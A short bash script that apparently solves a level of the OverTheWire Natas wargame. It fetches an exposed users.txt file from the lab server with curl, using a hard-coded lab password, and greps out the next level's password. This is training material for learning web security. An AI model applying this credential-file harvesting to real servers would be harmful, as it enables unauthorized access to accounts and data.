#!/usr/bin/bash

curl -s -u natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi http://natas2.natas.labs.overthewire.org/files/users.txt | grep -Po '(?<=(natas3:)).*(?=)'
